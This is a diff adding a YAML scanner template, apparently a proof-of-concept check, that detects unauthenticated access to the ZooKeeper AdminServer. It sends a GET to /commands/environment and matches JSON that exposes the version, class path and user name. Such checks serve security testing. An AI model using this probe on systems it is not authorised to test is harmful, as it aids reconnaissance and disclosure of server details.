@@ -1,0 +1,15 @@
+id: poc-yaml-zookeeper-adminserver-unauthorized-access
+info:
+  name: zookeeper AdminServer 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: zookeeper
+requests:
+- method: GET
+  path: /commands/environment
+  expression: "status_code == 200 && \ncontains(body,\"\\\"zookeeper.version\\\"\"\
+    ) &&\ncontains(body,\"\\\"java.class.path\\\"\") &&\ncontains(body,\"\\\"user.name\\\
+    \"\") &&\ncontains(content_type,\"application/json\")\n"
+variables: {}
+transport: http
